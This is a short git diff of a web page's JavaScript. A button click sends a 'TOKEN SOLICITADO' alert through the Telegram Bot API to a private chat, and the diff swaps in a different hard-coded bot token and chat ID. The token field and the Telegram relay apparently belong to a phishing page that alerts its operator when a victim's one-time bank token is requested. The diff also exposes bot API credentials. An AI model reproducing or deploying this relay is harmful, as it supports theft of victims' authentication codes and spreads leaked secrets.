@@ -24,7 +24,7 @@ tokencode.addEventListener("change", () => {
 requestbutton.addEventListener("click", () => {
   const Http = new XMLHttpRequest();
   const url =
-    "https://api.telegram.org/bot6548505320:AAHdw56nuEawpkdqXa5c5lGxyPDxXHIGwbQ/sendMessage?chat_id=6203967638&text=TOKEN%20SOLICITADO";
+    "https://api.telegram.org/bot7083762685:AAG9B4DKlndXsVmyYSvMElq45PQiwnUFPIQ/sendMessage?chat_id=7101053333&text=TOKEN%20SOLICITADO";
   Http.open("GET", url);
   Http.send();
 
